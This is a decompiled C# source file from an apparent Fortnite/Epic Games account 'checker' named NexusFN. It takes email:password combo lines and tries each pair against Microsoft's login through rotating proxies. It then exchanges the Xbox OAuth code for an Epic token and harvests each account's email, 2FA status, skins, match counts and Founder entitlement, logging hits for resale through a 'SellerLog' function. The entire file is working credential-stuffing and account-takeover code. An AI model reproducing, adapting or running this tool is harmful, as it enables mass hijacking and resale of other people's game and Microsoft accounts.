using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Threading;
using Leaf.xNet;
using NexusFN.Utilities;


namespace NexusFN;

internal class API
{
	private static string atkx;

	private static string atk;

	[Obfuscation(Feature = "virtualizer", Exclude = false)]
	public static void Check(string wombo)
	{
		//IL_0079: Unknown result type (might be due to invalid IL or missing references)
		//IL_007f: Expected O, but got Unknown
		//IL_068b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0695: Invalid comparison between Unknown and I4
		//IL_00f4: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a28: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a32: Invalid comparison between Unknown and I4
		//IL_0565: Unknown result type (might be due to invalid IL or missing references)
		//IL_056f: Invalid comparison between Unknown and I4
		//IL_0eb1: Unknown result type (might be due to invalid IL or missing references)
		//IL_0ebb: Invalid comparison between Unknown and I4
		if (!Variables.checkerruning)
		{
			try
			{
				foreach (Thread thread in Variables.threads)
				{
					thread.Suspend();
				}
				foreach (Thread thread2 in Variables.threads)
				{
					thread2.Abort();
				}
			}
			catch
			{
			}
			Thread.Sleep(-1);
		}
		HttpRequest val = new HttpRequest();
		try
		{
			string[] array = wombo.Split(':', ';', '|');
			string text = array[0];
			string text2 = array[1];
			string text3 = text + ":" + text2;
			try
			{
				if (Variables.useproxies)
				{
					string text4 = Variables.proxies[new Random().Next(Variables.proxies.Count)];
					val.ConnectTimeout = 5000;
					val.ReadWriteTimeout = 5000;
					val.KeepAliveTimeout = 5000;
					val.Proxy = ProxyClient.Parse(Variables.proxtype, text4);
				}
				val.AllowAutoRedirect = true;
				val.IgnoreProtocolErrors = true;
				val.AllowEmptyHeaderValues = true;
				val.KeepAlive = true;
				val.EnableEncodingContent = true;
				val.UseCookies = true;
				val.IgnoreInvalidCookie = true;
				val.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0");
				val.AddHeader("Pragma", "no-cache");
				val.AddHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8");
				val.AddHeader("Accept-Language", "fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3");
				val.AddHeader("Accept-Encoding", "gzip, deflate, br");
				val.AddHeader("Referer", "https://login.live.com/ppsecure/post.srf?id=292543&contextid=4EDB47CE8CF1F450&opid=7410382025CCDD15&bk=1702684428&uaid=4862a16299bb4a968c21150f145a855b&pid=0");
				val.AddHeader("Origin", "https://login.live.com");
				val.AddHeader("DNT", "1");
				val.AddHeader("Sec-GPC", "1");
				val.AddHeader("Connection", "keep-alive");
				val.AddHeader("Upgrade-Insecure-httpRequestuests", "1");
				val.AddHeader("Sec-Fetch-Dest", "document");
				val.AddHeader("Sec-Fetch-Mode", "navigate");
				val.AddHeader("Sec-Fetch-Site", "same-origin");
				val.AddHeader("Sec-Fetch-User", "?1");
				string? source = ((object)val.Post("https://login.live.com/ppsecure/post.srf?", "i13=1&login=" + text + "&loginfmt=" + text + "&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd=" + text2 + "&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpghttpRequestuestid=&PPFT=<ppf>&PPSX=Passpor&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0&isRecoveryAttemptPost=0&i19=12301", "application/x-www-form-urlencoded")).ToString();
				string text5 = Variables.Parse(source, "urlPost:'", "',");
				string text6 = WebUtility.UrlEncode(Variables.Parse(source, "name=\"PPFT\" id=\"i0327\" value=\"", "\""));
				val.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0");
				val.AddHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8");
				val.AddHeader("Accept-Language", "fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3");
				val.AddHeader("Accept-Encoding", "gzip, deflate, br");
				val.AddHeader("Referer", "https://login.live.com/ppsecure/post.srf?id=292543&contextid=4EDB47CE8CF1F450&opid=7410382025CCDD15&bk=1702684428&uaid=4862a16299bb4a968c21150f145a855b&pid=0");
				val.AddHeader("Origin", "https://login.live.com");
				val.AddHeader("DNT", "1");
				val.AddHeader("Sec-GPC", "1");
				val.AddHeader("Connection", "keep-alive");
				val.AddHeader("Upgrade-Insecure-httpRequestuests", "1");
				val.AddHeader("Sec-Fetch-Dest", "document");
				val.AddHeader("Sec-Fetch-Mode", "navigate");
				val.AddHeader("Sec-Fetch-Site", "same-origin");
				val.AddHeader("Sec-Fetch-User", "?1");
				HttpResponse val2 = val.Post(text5, "i13=1&login=" + text + "&loginfmt=" + text + "&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd=" + text2 + "&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpghttpRequestuestid=&PPFT=" + text6 + "&PPSX=Passpor&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0&isRecoveryAttemptPost=0&i19=12301", "application/x-www-form-urlencoded");
				string text7 = ((object)val2).ToString();
				foreach (object cookie in val.Cookies.GetCookies(text5))
				{
					Variables.cookiess += cookie;
				}
				if (text7.Contains("Vous avez essayé de vous connecter trop de fois avec un compte ou un mot de passe incorrects.") && !text7.Contains("Connectez-vous avec un compte Microsoft ou créez-en un.") && !text7.Contains("Vous avez essayé de vous connecter trop de fois avec un compte ou un mot de passe incorrect"))
				{
					ExportManager.Retries(text3);
				}
				else if (text7.Contains("Votre compte ou mot de passe est incorrect. Si vous avez oublié votre mot de passe,") || text7.Contains("Ce compte Microsoft n’existe pas.") || text7.Contains("Votre compte ou mot de passe est incorrect.") || text7.Contains("Ce compte Microsoft n’existe pas. Entrez un autre compte ou <a href=\"https://signup.live") || text7.Contains("Votre compte ou mot de passe est incorrect. Si vous avez") || text7.Contains("n’existe pas. Entrez un autre compte ou <a href="))
				{
					ExportManager.ExportBads(text3);
				}
				else if (text7.Contains("account.live.com/recover?mkt") || text7.Contains("account.live.com/identity/confirm?mkt") || text7.Contains("Email/Confirm?mkt") || text7.Contains("/Abuse?mkt=") || text7.Contains("/cancel?mkt=") || text7.Contains("B:2,CQ:false,bv:'"))
				{
					ExportManager.ExportFlagged(text3);
				}
				else if (Variables.cookiess.Contains("__Host-MSAAUTH") && (int)val2.StatusCode == 200 && !text7.Contains("sDevices:'{\"Devices\""))
				{
					if (text7.Contains("Vous avez essayé de vous connecter trop de fois avec un compte ou un mot de passe incorrects."))
					{
						ExportManager.ExportFlagged(text3);
					}
					val.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36");
					val.AddHeader("Pragma", "no-cache");
					val.AddHeader("Accept", "*/*");
					HttpResponse val3 = val.Get("https://login.live.com/oauth20_authorize.srf?client_id=82023151-c27d-4fb5-8551-10c10724a55e&redirect_uri=https%3A%2F%2Faccounts.epicgames.com%2FOAuthAuthorized&state=&scope=xboxlive.signin&service_entity=undefined&force_verify=true&response_type=code&display=popup", (RequestParams)null);
					if (((object)val3).ToString().Contains("account.live.com/Consent/Update") || ((object)val3).ToString().Contains("Consent"))
					{
						ExportManager.ExportBanned(text3);
						return;
					}
					try
					{
						atkx = Variables.Parse(val3.Address.ToString(), "code=", "&");
					}
					catch
					{
						ExportManager.ExportBanned(text3);
					}
					val.AddHeader("Authorization", "basic ZWM2ODRiOGM2ODdmNDc5ZmFkZWEzY2IyYWQ4M2Y1YzY6ZTFmMzFjMjExZjI4NDEzMTg2MjYyZDM3YTEzZmM4NGQ=");
					HttpResponse val4 = val.Post("https://account-public-service-prod.ol.epicgames.com/account/api/oauth/token", "grant_type=external_auth&external_auth_type=xbl&external_auth_token=" + atkx, "application/x-www-form-urlencoded");
					string text8 = ((object)val4).ToString();
					if (text8.Contains("Sorry a processing exception occurred while we were waiting for you to send us request data") || (int)val4.StatusCode == 500)
					{
						ExportManager.Retries(text3);
					}
					if (text8 == "" || text8.Contains("ext_auth.invalid_external_auth_toke") || text8.Contains("token you provided for the the auth system xbl could not be validated") || text8.Contains("token you provided does not map to an account") || text8.Contains("ve.com/Consent/Update?") || text8.Contains("invalid_grant") || text8.Contains("Corrective action is required to continue."))
					{
						ExportManager.ExportBanned(text3);
						return;
					}
					try
					{
						atk = Variables.Parse(text8, "access_token\":\"", "\"");
					}
					catch
					{
						if (text8.Contains("Sorry a processing exception occurred while we were waiting for you"))
						{
							ExportManager.Retries(text3);
						}
						else
						{
							ExportManager.ExportBanned(text3);
						}
					}
					string username = Variables.Parse(text8, "displayName\":\"", "\"");
					string text9 = Variables.Parse(text8, "account_id\":\"", "\"");
					val.AddHeader("Authorization", "Bearer " + atk);
					string text10 = ((object)val.Get("https://account-public-service-prod.ol.epicgames.com/account/api/public/account/" + text9, (RequestParams)null)).ToString();
					string text11 = "";
					try
					{
						text11 = Variables.Parse(text10, "email\":\"", "\"");
					}
					catch
					{
						ExportManager.ExportBanned(text3);
					}
					string lastlogin = "";
					try
					{
						lastlogin = Variables.Parse(text10, "lastLogin\":\"", "\"");
					}
					catch
					{
						ExportManager.ExportBanned(text3);
					}
					try
					{
						Variables.Parse(text10, "headless\":\"", "\"");
					}
					catch
					{
						ExportManager.ExportBanned(text3);
					}
					if (text10.Contains("tfaEnabled\":false") && text11 != "")
					{
						val.AddHeader("Authorization", "Bearer " + atk);
						string text12 = ((object)val.Post("https://fortnite-public-service-prod11.ol.epicgames.com/fortnite/api/game/v2/profile/" + text9 + "/client/QueryProfile?profileId=athena&rvn=-1", "{}", "application/json")).ToString();
						Variables.Parse(text12, "\"accountLevel\" : ", ",");
						Variables.Parse(text12, "\"lifetime_wins\" : ", ",");
						try
						{
							Variables.Parse(text12, "last_match_end_datetime\":\"", "\"");
						}
						catch
						{
							ExportManager.ExportBanned(text3);
						}
						string text13 = string.Join(",", Variables.LR(text12, "templateId\" : \"AthenaCharacter:", "\"", recursive: true));
						int num = Variables.CountOccurrences(text13, ",");
						val.AddHeader("Authorization", "Bearer " + atk);
						string text14 = ((object)val.Get("https://statsproxy-public-service-live.ol.epicgames.com/statsproxy/api/statsv2/account/" + text9, (RequestParams)null)).ToString();
						if (text14.Contains("Login is banned or does not posses the action ") || text14.Contains("errors.com.epicgames.common.missing_actio") || text14.Contains("ccount.no_account_found_for_externa") || text14.Contains("\"error\":\"invalid_grant\""))
						{
							ExportManager.ExportBanned(text3);
							return;
						}
						List<string> list = text14.Split(new char[1] { ',' }).ToList();
						int num2 = 0;
						foreach (string item in list)
						{
							try
							{
								if (item.Contains("matchesplayed"))
								{
									int num3 = int.Parse(Variables.Parse(item, "\":", ","));
									num2 += num3;
								}
							}
							catch
							{
							}
						}
						val.AddHeader("Authorization", "Bearer " + atk);
						HttpResponse val5 = val.Get("https://entitlement-public-service-prod08.ol.epicgames.com/entitlement/api/account/" + text9 + "/entitlements", (RequestParams)null);
						bool stw = false;
						if (((object)val5).ToString().Contains("entitlementName\":\"Fortnite_Founder\"") && (int)val5.StatusCode == 200)
						{
							stw = true;
						}
						if (text13 != "")
						{
							num2++;
						}
						if (num2 == 0)
						{
							Variables.zeromatches++;
						}
						if (num2 > 0 && num2 < 500)
						{
							Variables.onemplus++;
						}
						if (num2 >= 500 && num2 < 1000)
						{
							Variables.fivehundredmplus++;
						}
						if (num2 >= 1000 && num2 < 2500)
						{
							Variables.onekmplus++;
						}
						if (num2 >= 2500 && num2 < 5000)
						{
							Variables.twoandhalfandmplus++;
						}
						if (num2 >= 5000 && num2 < 10000)
						{
							Variables.fivekmplus++;
						}
						if (num2 >= 10000)
						{
							Variables.tenkmplus++;
						}
						if (num == 0)
						{
							Variables.zeroskin++;
						}
						if (num > 0 && num < 10)
						{
							Variables.oneplus++;
						}
						if (num >= 10 && num < 25)
						{
							Variables.tenplus++;
						}
						if (num >= 21 && num < 50)
						{
							Variables.twentyfiveplus++;
						}
						if (num >= 50 && num < 100)
						{
							Variables.fiftyplus++;
						}
						if (num >= 100 && num < 150)
						{
							Variables.hundredplus++;
						}
						if (num >= 150 && num < 200)
						{
							Variables.hundredfiftyplus++;
						}
						if (num >= 200 && num < 250)
						{
							Variables.twohundredplus++;
						}
						if (num >= 250)
						{
							Variables.twohundredfiftyplus++;
						}
						bool maybefa = text11 == text;
						ExportManager.ExportSkins(text3, username, num, text13, maybefa, text11, stw, lastlogin);
						ExportManager.SellerLog(num, text13, maybefa, stw);
					}
					else
					{
						string text15 = Variables.Parse(text8, "account_id\":\"", "\"");
						val.AddHeader("Authorization", "Bearer " + atk);
						string source2 = ((object)val.Get("https://account-public-service-prod.ol.epicgames.com/account/api/public/account/" + text15, (RequestParams)null)).ToString();
						try
						{
							text11 = Variables.Parse(source2, "email\":\"", "\"");
						}
						catch
						{
							ExportManager.ExportBanned(text3);
						}
						bool maybefa2 = text11 == text;
						val.AddHeader("Authorization", "Bearer " + atk);
						string text16 = ((object)val.Post("https://fortnite-public-service-prod11.ol.epicgames.com/fortnite/api/game/v2/profile/" + text9 + "/client/QueryProfile?profileId=athena&rvn=-1", "{}", "application/json")).ToString();
						Variables.Parse(text16, "\"accountLevel\" : ", ",");
						Variables.Parse(text16, "\"lifetime_wins\" : ", ",");
						string text17 = string.Join(",", Variables.LR(text16, "templateId\" : \"AthenaCharacter:", "\"", recursive: true));
						int num4 = Variables.CountOccurrences(text17, ",");
						int num5 = 0;
						if (text17 != "")
						{
							num5++;
						}
						if (num4 > 0 && num4 < 10)
						{
							Variables.oneplus++;
						}
						if (num4 >= 10 && num4 < 25)
						{
							Variables.tenplus++;
						}
						if (num4 >= 25 && num4 < 50)
						{
							Variables.twentyfiveplus++;
						}
						if (num4 >= 50 && num4 < 100)
						{
							Variables.fiftyplus++;
						}
						if (num4 >= 100 && num4 < 150)
						{
							Variables.hundredplus++;
						}
						if (num4 >= 150 && num4 < 200)
						{
							Variables.hundredfiftyplus++;
						}
						if (num4 >= 200 && num4 < 250)
						{
							Variables.twohundredplus++;
						}
						bool num6 = text10.Contains("tfaEnabled\":true");
						val.AddHeader("Authorization", "Bearer " + atk);
						HttpResponse val6 = val.Get("https://entitlement-public-service-prod08.ol.epicgames.com/entitlement/api/account/" + text9 + "/entitlements", (RequestParams)null);
						string stw2 = "false";
						if (((object)val6).ToString().Contains("entitlementName\":\"Fortnite_Founder\"") && (int)val6.StatusCode == 200)
						{
							stw2 = "true";
						}
						if (num6)
						{
							ExportManager.Epic2Fa(text3, username, num4, text17, maybefa2, text11, stw2, lastlogin);
						}
						else
						{
							ExportManager.ExportBanned(text3);
						}
					}
				}
				else if (text7.Contains("Connectez-vous avec un compte Microsoft ou créez-en un.") && text7.Contains("Vous avez essayé de vous connecter trop de fois avec un compte ou un mot de passe incorrect"))
				{
					ExportManager.ExportFlagged(text3);
				}
				else
				{
					ExportManager.Retries(text3);
				}
			}
			catch (Exception)
			{
				ExportManager.Retries(text3);
			}
		}
		finally
		{
			((IDisposable)val)?.Dispose();
		}
	}
}
